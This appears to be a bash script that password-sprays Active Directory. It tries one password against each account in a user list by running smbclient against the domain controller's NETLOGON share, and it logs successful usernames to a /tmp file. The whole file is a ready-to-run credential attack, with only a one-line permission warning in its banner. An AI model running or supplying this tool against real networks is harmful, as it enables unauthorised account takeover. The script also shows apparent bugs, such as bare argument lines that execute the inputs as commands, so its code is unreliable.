#!/bin/bash

#HELP menu on error
help()
{
echo ""
echo ""
echo "[-] ERROR"
echo ""
echo ""
echo "[*] You must provide ARGs."
echo ""
echo "              PASSWORD       DC_IP       DOMAINE_NAME          USERS_LIST"
echo "./script.sh SuperPass000! 192.168.0.5 superdomaine.local /tmp/AD_Users_List.txt"
echo ""
exit
}

#VAR
$1
$2
$3
$4
pass=$(echo "$1")
share=$(echo "//$2/NETLOGON/")
domain=$(echo "$3")
list=$(echo "$4")

#Check if userlist are provided
if [ -z "$4" ]; then
    help
fi
#Check if Password is provided
if [ -z "$1" ]; then
    help
fi
#Check dc-ip is provided
if [ -z "$2" ]; then
    help
fi
#Check if Domain_Name is provided
if [ -z "$3" ]; then
    help
fi

nb_login=$(cat $list | wc -l)

banner()
{
clear
echo "                 ,*-."
echo '                 |  |'
echo '             ,.  |  |'
echo '             | |_|  | ,.'
echo '             `---.  |_| |'
echo '                 |  .--`'
echo "                 |  |"
echo "                 |  |"
echo ""
echo " ! DO NOT USE IF YOU DONT HAVE PERSMISSION !"
echo ""
echo "  ArianeBlow obvious BASH password checker"
echo ""
echo "         SMB Password Sprayer"
echo ""
echo "INFOS :"
echo "[+] Testing password : $pass "
echo "[*] $nb_login domain accounts loaded"
echo ""
echo ""
echo ""
}

clear
echo ""
echo ""
echo ""
banner
ping 127.0.0.1 -c 5 >/dev/null

#Cleaning the /tmp result file if allready present OR create the /tmp result file
echo "" > /tmp/password-found-$1.dat
echo "password tested = $1" >> /tmp/password-found-$1.dat

#Spray brut
for i in $(cat $list); do
#clean the test file
    echo "" > test.txt
#Run an PWD command on the SMB share
    smbclient $share -U $domain/$i -K $1 -c pwd |tee test.txt >/dev/null
#If the test.txt file contain "NETLOGON" the password's good, else, it send a failure message
    if [ $(cat test.txt | grep -c "NETLOGON") -eq 1 ]; then
        banner
        echo -e "\e[32m[+] Password found for user $i\e[0m" && echo "$i" >> /tmp/password-found-$1.dat
        echo ""
        echo ""
        echo ""
        cat /tmp/password-found-$1.dat  
        ping 127.0.0.1 -c 1 >/dev/null
    else 
        banner 
        echo "[-] Tested user : $i "
        echo ""
        echo ""
        echo ""
        cat /tmp/password-found-$1.dat
    fi
done
echo "result are stocked in TMP file : /tmp/password-found-$1.dat"
rm test.txt
